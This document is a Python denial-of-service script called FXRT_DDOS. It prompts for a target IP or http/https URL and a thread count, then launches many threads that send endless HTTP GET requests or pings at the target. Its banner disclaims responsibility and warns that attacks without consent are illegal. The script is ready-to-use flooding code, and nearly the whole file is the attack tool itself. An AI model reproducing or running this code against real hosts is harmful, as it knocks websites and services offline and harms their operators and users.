#creator: Fxrt2711
#version: 4.0.4
#date: 25/1/24
#update: 28/1/24
#
try:
    import os
except:
    exit("missing MAIN lib: os !! \n install it with: pip install os")
try:
    import sys
except:
    exit("missing MAIN lib: sys !! \n install it with: pip install sys")
try:
    from ping3 import ping, verbose_ping
except:
    exit("missing MAIN lib: ping3 !! \n install it with: pip install ping3")
try:
    from colorama import Fore
except:
    exit("missing lib: colorama !! \n install it with: pip install colorama")
try:
    import threading
except:
    exit("missing lib: threading !! \n install it with: pip install treading")
try:
    import requests
except:
    exit("missing lib: requests !! \n install it with: pip install requests")
try:
    from time import sleep
except:
    exit("missing lib: time !! \n install it with: pip install time")
#
op_sy = sys.platform
#
#
def clear():
    if op_sy == ("linux"):
        os.system("clear")
    else:
        os.system("cls")
#
#
def dos_trget(target,st):
#
#    print(st)
    while True:
        try:
            if st == ("ip"):
                try:
                    ives = ping(target)
                    print(f"ping sented to {target} delay: {ives}")
                except:
                    try:
                        print(f"waiting for {target} to accept")
                    except:
                        exit()
                try:
                    pass
                except:
                    exit()
#
            else:
                rves = requests.get(target)
                rxes = requests.get(target)
                try:
                    print(f"Request sented to {target}")
                except:
                    exit()
#
        except requests.exceptions.ConnectionError:
            sleep(0.1)
            try:
                print("Check internet connection")
            except:
                exit()
#
#
while True:
    clear()
    print(Fore.RED + """

                ╔═══╗╔═╗╔═╗╔═══╗╔════╗    ╔═══╗╔═══╗╔═══╗╔═══╗
                ║╔══╝╚╗╚╝╔╝║╔═╗║║╔╗╔╗║    ╚╗╔╗║╚╗╔╗║║╔═╗║║╔═╗║
                ║╚══╗ ╚╗╔╝ ║╚═╝║╚╝║║╚╝     ║║║║ ║║║║║║ ║║║╚══╗
                ║╔══╝ ╔╝╚╗ ║╔╗╔╝  ║║       ║║║║ ║║║║║║ ║║╚══╗║
               ╔╝╚╗  ╔╝╔╗╚╗║║║╚╗ ╔╝╚╗     ╔╝╚╝║╔╝╚╝║║╚═╝║║╚═╝║
               ╚══╝  ╚═╝╚═╝╚╝╚═╝ ╚══╝     ╚═══╝╚═══╝╚═══╝╚═══╝
        (◣_◢)I am not responsible for damage caused by FXRT_DDOS (◣_◢)
    (◣_◢)Attacking targets without prior mutual consent is ILLIGAL!!!(◣_◢)
    """)
#
    run_url = True
    run_http_url = True
    run_https_url = True
    run_ip = True
    run_target_selsection = True
#
    while run_target_selsection:
#
        print (Fore.GREEN + "do you want to ddos (ip)(https)(http)")
        un_selection_input = input("~> ")
        selection_input = un_selection_input.replace(' ','')
#
        if selection_input == ("http"):
            while run_http_url:
#
                unh_target_url_ip = input(Fore.GREEN + "Enter URL>> ")
                target_url_ip = unh_target_url_ip.replace(' ','')
#
                if target_url_ip.startswith("https"):
                    print("wrong url. you can,t ddos https")
                    pass
#
                elif not target_url_ip.__contains__("."):
                    print("invalid domain")
                    pass
#
                else:
                    run_http_url = False
                    run_target_selsection = False
#
        elif selection_input == ("https"):
            while run_https_url:
#
                unhp_target_url_ip = input(Fore.GREEN + "Enter URL>> ")
                target_url_ip = unhp_target_url_ip.replace(' ','')
#
                if not target_url_ip.startswith("https"):
                    print("wrong url. you can,t ddos http")
                    pass
#
                elif not target_url_ip.__contains__("."):
                    print("invalid domain")
                    pass
#
                else:
                    run_https_url = False
                    run_target_selsection = False
#
        elif selection_input == ("ip"):
            while run_ip:
#
                unip_target_url_ip = input(Fore.GREEN + "Enter IP>> ")
                target_url_ip = unip_target_url_ip.replace(' ','')
#
                if not target_url_ip.__contains__("."):
                    print("invalid ip")
                    pass
#
                else:
                    run_ip = False
                    run_target_selsection = False
#
        else:
            pass
#
#
    run_threads = True
    while run_threads:
        try:
#
            threads = int(input(Fore.GREEN + "Threads: " + Fore.RED + ""))
#
            if threads <= 0:
                print("invalid number")
                pass
            elif threads == ():
                print("invalid number")
                pass
            else:
                run_threads = False
#
        except:
            print("invalid number")
            pass
# 
#
    print("press enter to start the attack")
    nothing = input("")
#
    if not selection_input == ("ip"):
        for i in range(0, threads):
#
            thr = threading.Thread(target=dos_trget, args=(target_url_ip,"ht",))
            thr_1 = threading.Thread(target=dos_trget, args=(target_url_ip,"ht",))
            thr_2 = threading.Thread(target=dos_trget, args=(target_url_ip,"ht",))
            thr_3 = threading.Thread(target=dos_trget, args=(target_url_ip,"ht",))
            thr_4 = threading.Thread(target=dos_trget, args=(target_url_ip,"ht",))
            thr_5 = threading.Thread(target=dos_trget, args=(target_url_ip,"ht",))
            thr_6 = threading.Thread(target=dos_trget, args=(target_url_ip,"ht",))
            thr_7 = threading.Thread(target=dos_trget, args=(target_url_ip,"ht",))
            thr_8 = threading.Thread(target=dos_trget, args=(target_url_ip,"ht",))
#
            thr.start()
            thr_1.start()
            thr_2.start()
            thr_3.start()
            thr_4.start()
            thr_5.start()
            thr_6.start()
            thr_7.start()
            thr_8.start()
            try:
                print(f"waiting for {target_url_ip} to accept")
            except:
                exit()
    else:
        dos_trget(target_url_ip,"ip")
